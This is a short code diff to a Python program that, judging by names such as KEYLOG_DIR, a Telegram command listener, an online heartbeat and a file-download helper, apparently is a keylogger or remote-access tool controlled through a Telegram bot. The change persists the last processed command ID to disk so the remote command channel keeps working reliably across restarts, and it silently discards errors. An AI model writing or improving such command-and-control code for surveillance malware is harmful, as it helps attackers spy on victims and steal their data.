@@ -497,7 +497,27 @@ import atexit
 atexit.register(_telegram_mark_offline)
 
 _TELEGRAM_HEARTBEAT_RUNNING = True
-_TG_CMD_LAST_UPDATE_ID = 0
+_TG_UPDATE_ID_FILE = os.path.join(KEYLOG_DIR, "_tg_last_update_id")
+
+def _load_tg_last_update_id() -> int:
+    """Load last processed Telegram update ID from file."""
+    try:
+        if os.path.exists(_TG_UPDATE_ID_FILE):
+            with open(_TG_UPDATE_ID_FILE, 'r') as f:
+                return int(f.read().strip())
+    except:
+        pass
+    return 0
+
+def _save_tg_last_update_id(update_id: int):
+    """Persist last processed Telegram update ID to file."""
+    try:
+        with open(_TG_UPDATE_ID_FILE, 'w') as f:
+            f.write(str(update_id))
+    except:
+        pass
+
+_TG_CMD_LAST_UPDATE_ID = _load_tg_last_update_id()
 _TG_PENDING_ACTION = None
 
 def _download_tg_file(file_id: str, save_path: str) -> bool:
@@ -536,6 +556,7 @@ def _telegram_command_listener():
             updates = resp.json().get("result", [])
             for update in updates:
                 _TG_CMD_LAST_UPDATE_ID = update.get("update_id", _TG_CMD_LAST_UPDATE_ID)
+                _save_tg_last_update_id(_TG_CMD_LAST_UPDATE_ID)
                 msg = update.get("message", {})
                 chat_id = str(msg.get("chat", {}).get("id", ""))
                 if chat_id != str(TELEGRAM_CHAT_ID):
